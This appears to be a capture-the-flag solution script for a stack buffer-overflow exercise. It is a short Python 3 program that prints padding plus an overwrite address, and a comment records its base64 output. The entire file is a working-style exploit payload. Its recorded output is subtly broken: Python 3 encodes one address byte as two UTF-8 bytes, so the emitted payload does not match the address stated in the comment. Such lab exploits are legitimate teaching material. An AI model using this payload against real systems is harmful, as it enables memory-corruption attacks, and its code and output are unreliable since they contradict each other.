#!/usr/bin/env python3

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
padding += "\x24\x84\x04\x08" # 0x08048424
print(padding)

# OUT:
"""
# python3 stack3_overwrite.py > exp
# base64:QUFBQUJCQkJDQ0NDREREREVFRUVGRkZGR0dHR0hISEhJSUlJSkpKSktLS0tMTExMTU1NTU5OTk5PT09PUFBQUCTChAQICg==
"""